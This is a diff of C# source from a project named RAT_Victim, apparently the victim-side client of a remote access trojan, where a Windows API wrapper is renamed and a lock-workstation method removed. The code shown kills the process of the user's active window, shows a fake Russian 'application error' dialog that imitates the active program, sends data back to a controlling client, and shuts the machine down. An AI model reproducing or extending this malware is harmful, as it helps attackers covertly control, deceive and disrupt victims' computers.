@@ -14,16 +14,16 @@ namespace RAT_Victim
 
         internal static void CloseActiveWindow()
         {
-            var window = PInvoke.GetForegroundWindow();
-            PInvoke.GetWindowThreadProcessId(window, out var processId);
-            var process = PInvoke.OpenProcess(1, true, processId);
-            PInvoke.TerminateProcess(process, 0);
+            var window = WinApi.GetForegroundWindow();
+            WinApi.GetWindowThreadProcessId(window, out var processId);
+            var process = WinApi.OpenProcess(1, true, processId);
+            WinApi.TerminateProcess(process, 0);
         }
 
         internal static void ShowMessageBox()
         {
-            var window = PInvoke.GetForegroundWindow();
-            PInvoke.MessageBox(window,
+            var window = WinApi.GetForegroundWindow();
+            WinApi.MessageBox(window,
                 "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
                 GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
         }
@@ -38,11 +38,6 @@ namespace RAT_Victim
             if (data != null) Program.Client.Send(data);
         }
 
-        internal static void Lock()
-        {
-            PInvoke.LockWorkStation();
-        }
-
         internal static void Shutdown()
         {
             var process = new Process
@@ -55,15 +50,15 @@ namespace RAT_Victim
 
         private static string GetActiveWindowTitle()
         {
-            var window = PInvoke.GetForegroundWindow();
+            var window = WinApi.GetForegroundWindow();
             var builder = new StringBuilder();
-            PInvoke.GetWindowText(window, builder, builder.MaxCapacity);
+            WinApi.GetWindowText(window, builder, builder.MaxCapacity);
             return builder.ToString();
         }
 
         public static void SendMessage(string message)
         {
-            PInvoke.MessageBox(PInvoke.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
+            WinApi.MessageBox(WinApi.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
         }
 
         public static void PlaySound(Stream audioStream)
